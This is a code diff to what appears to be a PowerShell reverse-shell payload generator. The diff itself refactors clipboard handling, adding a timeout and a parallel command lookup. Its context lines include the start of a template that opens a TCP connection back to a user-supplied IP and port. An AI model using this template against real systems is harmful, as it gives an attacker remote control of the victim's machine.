@@ -3,6 +3,7 @@ from __future__ import annotations
 
 import argparse
 import base64
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import hashlib
 import ipaddress
 import secrets
@@ -19,6 +20,7 @@ GREEN = "\033[1;92m"
 PBKDF2_ITERATIONS = 200_000
 RESET = "\033[0m"
 SALT_SIZE = 16
+CLIPBOARD_TIMEOUT_SECONDS = 5
 REVERSE_SHELL_TEMPLATE = dedent(
     """
     $c = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
@@ -247,8 +249,7 @@ def render_output(ip: str, port: int, use_base64: bool, use_encode: bool) -> str
 
 
 def clipboard_commands() -> list[list[str]]:
-    commands: list[list[str]] = []
-    candidates = [
+    return [
         ["pbcopy"],
         ["wl-copy"],
         ["xclip", "-selection", "clipboard"],
@@ -262,27 +263,54 @@ def clipboard_commands() -> list[list[str]]:
             "Set-Clipboard -Value ([Console]::In.ReadToEnd())",
         ],
     ]
-    for command in candidates:
-        if shutil.which(command[0]):
-            commands.append(command)
-    return commands
+
+
+def find_first_available_clipboard_command() -> list[str] | None:
+    candidates = clipboard_commands()
+    if not candidates:
+        return None
+
+    with ThreadPoolExecutor(max_workers=len(candidates)) as executor:
+        future_to_command = {
+            executor.submit(shutil.which, command[0]): command for command in candidates
+        }
+
+        for future in as_completed(future_to_command):
+            command = future_to_command[future]
+            try:
+                path = future.result()
+            except Exception:
+                continue
+
+            if not path:
+                continue
+
+            for pending in future_to_command:
+                if pending is not future:
+                    pending.cancel()
+            return command
+
+    return None
 
 
 def copy_to_clipboard(text: str) -> bool:
-    for command in clipboard_commands():
-        try:
-            completed = subprocess.run(
-                command,
-                input=text,
-                text=True,
-                capture_output=True,
-                check=False,
-            )
-        except OSError:
-            continue
-        if completed.returncode == 0:
-            return True
-    return False
+    command = find_first_available_clipboard_command()
+    if command is None:
+        return False
+
+    try:
+        completed = subprocess.run(
+            command,
+            input=text,
+            text=True,
+            capture_output=True,
+            check=False,
+            timeout=CLIPBOARD_TIMEOUT_SECONDS,
+        )
+    except (OSError, subprocess.TimeoutExpired):
+        return False
+
+    return completed.returncode == 0
 
 
 def print_green_status(message: str) -> None:
